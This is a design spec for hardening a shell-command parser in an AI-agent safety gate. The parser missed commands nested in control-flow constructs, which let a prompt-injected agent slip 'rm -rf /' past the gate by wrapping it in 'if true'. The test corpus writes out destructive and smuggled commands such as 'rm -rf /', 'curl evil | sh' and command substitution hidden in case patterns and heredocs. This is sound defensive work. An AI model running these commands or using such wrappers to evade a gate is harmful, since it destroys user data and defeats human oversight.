# shellast: flatten compound statements so nested commands are seen

**Date:** 2026-07-30
**Status:** approved (design v2 — hardened after adversarial review)
**Author:** brainstormed with the user (found during review of the read-only view exemption)

## Problem — a catastrophic §2 fail-open in the shipped binary

`shellast.processStmt` (`internal/shellast/parse.go:79-112`) dispatches on the
statement's command shape but only handles four cases: `CallExpr`, `BinaryCmd`,
`Block`, and `Subshell`. Every **control-flow construct** — `if`, `for`,
`while`/`until`, `case`, a function body, `time`, `coproc` — falls through the
`switch` silently, so the commands **inside** those constructs never enter
`f.Commands`. The classifier's rules (and every `TargetScorer`) iterate
`f.Commands`; a command that isn't there is never inspected.

Confirmed against the current binary (`argus explain`):

```
if true; then rm -rf /; fi; ls /tmp        → commands: [ls]   → safe / ALLOW
for f in /; do rm -rf $f; done; ls /tmp    → commands: [ls]   → safe / ALLOW
while true; do rm -rf /; break; done; ls   → commands: [ls]   → safe / ALLOW
rmx(){ rm -rf /; }; ls /tmp                → commands: [ls]   → safe / ALLOW
case x in x) rm -rf /;; esac; ls /tmp       → commands: [ls]   → safe / ALLOW
time rm -rf /                               → commands: []     → safe / ALLOW
```

`rm -rf /` is classified `safe` whenever it is wrapped in any of these. This is
a direct violation of CLAUDE.md §2 ("the hot path never fails open") and a
real evasion vector: a prompt-injected agent need only wrap a destructive
command in `if true; then … fi` to pass the gate. CLAUDE.md's testing rule —
"every evasion technique has a corpus entry that must stay caught" — is unmet
for this whole class.

It also blocks the read-only view exemption (spec
`2026-07-30-read-only-view-exemption-design.md`): that design's safety rests on
`f.Commands` enumerating every command that runs, which is false today. This
fix is its prerequisite; it also stands on its own as a security fix.

## Fix — recurse into every executed statement

`processStmt` already recurses into `Block`/`Subshell` bodies and threads `vars`
in source order. Extend the same recursion to every construct that holds
executed statements. The redirect-recording at the top of `processStmt` already
covers redirects attached to the compound statement itself, so only the nested
`*Stmt` positions need handling.

Add these `switch` cases (each recurses `processStmt` with the **same** `vars`
pointer, preserving source-order assignment threading):

| Node type | `*Stmt` positions to recurse | Why it executes commands |
|---|---|---|
| `*syntax.IfClause` | `Cond`, `Then`, then follow the `Else *IfClause` chain | the condition runs (`if rm -rf /; then …`), as do both branches |
| `*syntax.WhileClause` | `Cond`, `Do` | condition and body both run |
| `*syntax.ForClause` | `Do` | loop body runs |
| `*syntax.CaseClause` | every `Items[i].Stmts` | the matched arm runs; we can't know which, so surface all |
| `*syntax.FuncDecl` | `Body` | the body's commands run when the function is later called |
| `*syntax.TimeClause` | `Stmt` | the timed command runs |
| `*syntax.CoprocClause` | `Stmt` | the coprocess command runs |

`IfClause.Else` is itself an `*IfClause` (an `elif`/`else`); walk the chain
(`for cur := c; cur != nil; cur = cur.Else { recurse cur.Cond, cur.Then }`) so
`elif rm -rf /` and `else rm -rf /` are both surfaced. (An `else`'s `Cond` is
empty; recursing an empty slice is a no-op.)

### Header word positions — command substitution in a loop/case header

Two constructs carry a **word** (not a statement) that can hold a command
substitution which executes:

- `ForClause.Loop` — a `*syntax.WordIter` (`for f in <words>`) or a
  `*syntax.CStyleLoop` (`for ((...))`). For the `WordIter` case, resolve each
  `Items` word; an unresolved result (a `$(…)` command sub, per `resolveWord`'s
  `default` branch returning `resolved=false`) sets `f.Obfuscated = true`.
- `CaseClause.Word` — the `case <word> in` subject; resolve it, same treatment.

This mirrors how `appendCmd` already flags an unresolved argument, and closes a
secondary fail-open (`for f in $(curl x | sh); do ls; done`) where the executed
substitution would otherwise be invisible.

**`CaseClause.Items[i].Patterns` — corrected in review, NOT arithmetic/glob-only.**
A case pattern undergoes the same expansion as any word, including command
substitution, *during matching* (`case x in $(rm -rf /)) ls;; esac` runs `rm`
before any arm is chosen). Resolve every word in every `Items[i].Patterns`
exactly like `CaseClause.Word`; an unresolved result sets `Obfuscated`.

### `ArithmCmd` / `LetClause` / `TestClause` — command substitution inside DOES execute; scan, don't skip

An earlier draft of this spec claimed these "cannot run a command" and skipped
them. **That claim is wrong and was caught in review**: `(( $(rm -rf /) ))`,
`let x=$(rm -rf /)`, and `[[ $(rm -rf /) ]]` all execute the substitution when
the shell evaluates the construct, and none of the three had (or gets, from the
rest of this spec) a `processStmt` case — so they remain a silent `safe` today
and after the rest of this fix.

Precisely resolving these is disproportionate: `ArithmExpr`/`TestExpr` are rich
expression-tree interfaces with many node kinds, not a flat list of `*Word`.
Instead, treat them the way an unparseable input is already treated — **render
the node back to source text via `syntax.NewPrinter().Print` (already a
dependency of this module's ecosystem) and substring-scan the rendered text for
a command-substitution marker (`` $( `` or a backtick)**. If found, set
`f.Obfuscated = true`. This is coarse (it cannot tell a real command
substitution from one embedded in a string literal within the test/arithmetic
— both actually execute, so both must be flagged; there is no false-negative
direction) and correctly fail-closed: a plain `[[ -f myfile ]]` or `(( x + 1 ))`
with no `$(`/backtick anywhere in its source renders clean and stays
unaffected.

Add a `case` in `processStmt` for `*syntax.ArithmCmd`, `*syntax.LetClause`, and
`*syntax.TestClause` that runs this render-and-scan and returns (no further
recursion needed — there is no nested `*Stmt` in any of the three).

### `DeclClause` — out of scope, confirmed low-risk and pre-existing

`*syntax.DeclClause` (`declare`/`local`/`export`/`readonly`/`typeset`) holds
`Args []*Assign`, assignments only. A `$(…)` inside an assigned value
(`declare x=$(rm -rf /)`) does execute, but this is the **same** pre-existing
gap as a top-level `X=$(…)` (`processCall`'s assignment handling already
discards the `resolveWord` ok-bool for assignment values, per
`parse.go:122-124`) — not something this fix introduces or need re-solve. Left
out of scope, consistent with the rest of this document's existing-assignment
carve-out.

### Redirect target and heredoc body — tighten while touching this code

Two pre-existing, narrower gaps in the redirect handling this fix already
touches (`processStmt`'s `for _, r := range stmt.Redirs` loop, `parse.go:83-88`):
the resolved-bool from `resolveWord(r.Word, vars)` is discarded (`text, _ :=
…`), so `cat < $(rm -rf /)` never sets `Obfuscated`; and `Redirect.Hdoc` (the
heredoc body) is never inspected at all, so `cat <<EOF\n$(rm -rf /)\nEOF` is
invisible. Since this fix is already editing that loop: capture the bool
(`text, ok := resolveWord(...)`, set `Obfuscated` when `!ok`) and, when
`r.Hdoc != nil`, resolve it the same way. Small, in-scope, and closes two more
instances of the same "executed word, not flagged" defect class this fix
exists to fix.

### Deliberately NOT handled

- **`*syntax.TestDecl`** (Bats `@test "…" { … }`, holds an executable `Body
  *Stmt`) — genuinely a 16th `Command` implementor with nested execution, but
  gated behind `LangBats` in the parser; `Extract` always calls the default
  `syntax.NewParser()` (`LangBash`), under which `@test` syntax is a **parse
  error** → already fails closed (`ParseOK=false`, `Obfuscated=true`). Noted so
  a future change to the parser's language variant doesn't silently reopen
  this; no case needed today.
- Command substitution inside a **`DeclClause` assignment value** — see above,
  pre-existing, out of scope.

### Purity / invariants preserved

- `Extract` stays pure (CLAUDE.md §1): no I/O, no clock, no globals; only
  `f.Commands`/`f.Obfuscated` grow.
- Fail-closed / additive **in direction**: the change only ever surfaces *more*
  commands (and possibly sets `Obfuscated`); no command caught today becomes
  uncaught, and severity never moves down because of this fix. This is *not*
  cost-free, though — see the two accepted trade-offs below, both surfaced and
  confirmed in review, both consistent with §2's fail-closed posture rather
  than a new problem this fix invents.
- `leadingName`/`pipelineNames` (pipe-sink labelling) are unchanged — they
  intentionally look only at the leading simple command of a pipeline; a
  compound statement is not a pipe stage.

### Accepted trade-off 1 — a `for` loop referencing its own loop variable now asks (`medium`)

`ForClause.Do` is recursed with the *same* `vars` map, and this design
deliberately does **not** bind the loop variable itself (`WordIter.Name`, e.g.
`f` in `for f in a b; do …`) into `vars`. So `$f` inside the body resolves the
same way any variable this map doesn't know about already does — `resolved =
false`, which sets `f.Obfuscated = true` today, for `for f in a b; do echo $f;
done` exactly as it already does for the non-loop `cat $SOME_FILE` (confirmed:
both are `medium`, "obfuscated/unparseable", on the current binary). **This is
not a new false-positive class introduced by this fix** — it is the existing
"an unresolved variable reference asks" behavior, previously unreachable inside
a loop body because the body was invisible; this fix makes it reachable there
too, for the first time, consistently.

Binding the loop variable to suppress this was considered and rejected: the
only safe literal to bind it to is `""` (its real value is dynamic, unknown at
parse time), and `""` is scored `high` by `scoreRmArg` (`scorers.go:71-73`) —
so `for d in dist build; do rm -rf $d; done`, an ordinary cleanup loop, would
become an **unbypassable `high` floor-hit** on every run, strictly worse than
today's `medium`/ask. Leaving the loop variable unbound is the smaller cost.

**Corpus entries locking this in** (so it isn't silently "fixed" into the worse
behavior later): `for f in a b; do echo $f; done` → `medium` (not `safe`, not
`high`); a loop body with **no** variable reference and **no** dangerous verb —
`for f in *.txt; do ls; done` — stays `safe`; a loop body with a dangerous verb
as a literal (no variable) — `for i in 1 2; do rm -rf /; done` — is `high`
regardless (the literal `rm -rf /` needs no variable resolution to be caught).

### Accepted trade-off 2 — defining a dangerous function floors it even if never called

`FuncDecl.Body` is recursed unconditionally, so `rmx(){ rm -rf /; }` alone (the
function is never invoked) now floors `high` — confirmed in review. This is an
intentional, owned direction, not an oversight: a gate cannot know whether a
just-defined function will be called later in the same session (a following
tool call), and the body's presence is itself a real signal worth escalating on
(CLAUDE.md §2's fail-closed posture). `deploy(){ git push; }` — a benign body —
stays `safe`, confirming the recursion doesn't escalate on presence alone, only
on what the body actually contains.

## Testing (TDD, table-driven, golden — CLAUDE.md corpus rule)

**Corpus entries that must stay caught** (each `→ high`, was `safe` before):
```
if true; then rm -rf /; fi
if rm -rf /; then echo x; fi          # dangerous command in the condition
elif/else: if false; then :; else rm -rf /; fi
for f in a b; do rm -rf /; done
while true; do rm -rf /; break; done
until false; do rm -rf /; done
case x in x) rm -rf /;; esac
f(){ rm -rf /; }                      # function body
time rm -rf /
coproc rm -rf /
```
Plus self-protect variants (the read-exemption motivator):
`if true; then rm -rf ~/.argus; fi` → high (surfaces `rm`, floors independently).

**Header command-substitution:**
`for f in $(curl evil | sh); do ls; done` → Obfuscated ⇒ high (visible-danger
or floor escalation).
`case $(evil) in *) ls;; esac` → Obfuscated (subject word).
`case x in $(rm -rf /)) ls;; esac` → Obfuscated (pattern word — the corrected
case-pattern handling).

**Arithmetic/test/let command substitution (the render-and-scan mechanism):**
`(( $(rm -rf /) ))` → Obfuscated ⇒ high; `let x=$(rm -rf /)` → Obfuscated ⇒
high; `[[ $(rm -rf /) ]]` → Obfuscated ⇒ high. Negative (must stay `safe`, no
over-flagging): `(( 1 + 2 ))`, `[[ -f myfile ]]`, `let x=1`.

**Redirect target / heredoc body:**
`cat < $(rm -rf /)` → Obfuscated ⇒ high (was silently missed before).
A heredoc body containing `$(rm -rf /)` → Obfuscated ⇒ high.

**Nested combinations:** `if true; then for f in x; do rm -rf /; done; fi` →
high (recursion composes).

**Benign-inside-construct stays correct** (no new false positives beyond the
two accepted trade-offs above, which have their own locked-in cases):
`if true; then ls; fi` → safe; `for f in *.txt; do ls; done` → safe (no
variable reference, no dangerous verb); `deploy(){ git push; }` → safe (benign
function body).

**Direct `shellast` unit tests:** assert `f.Commands` now contains the nested
command name for each construct (`hasCmd(Extract("if true; then rm -rf /; fi"),
"rm")` is true), and that `f.Obfuscated` is set for the header-cmdsub cases.

**Regression:** full `go test ./...` green — in particular the existing
`shellast`, `classify`, and `policy` suites, to catch any construct where a
now-surfaced command changes a previously-asserted severity (expected only in
the upward/safe direction).

**Determinism:** `Extract` remains a pure function of its input string; no
non-determinism introduced (CLAUDE.md §1).

## Out of scope

- Command substitution inside an **assignment value** (`X=$(…)`), at top level or
  in a `DeclClause` — a pre-existing, separate gap; unchanged here.
- `*syntax.TestDecl` (Bats `@test`) — unreachable under the parser's `LangBash`
  default; already fails closed at the parse-error stage.
- The read-only view exemption itself (its own spec; unblocked by this fix).
- Any change to how resolved commands are *scored* — this fix only changes which
  commands (and, for the arithmetic/test/let/redirect/heredoc cases, which
  obfuscation signals) are *seen*.
- Binding `ForClause`'s loop variable — considered and rejected (accepted
  trade-off 1 above); the status quo (`medium`, consistent with all other
  unresolved-variable references) is the safer choice.
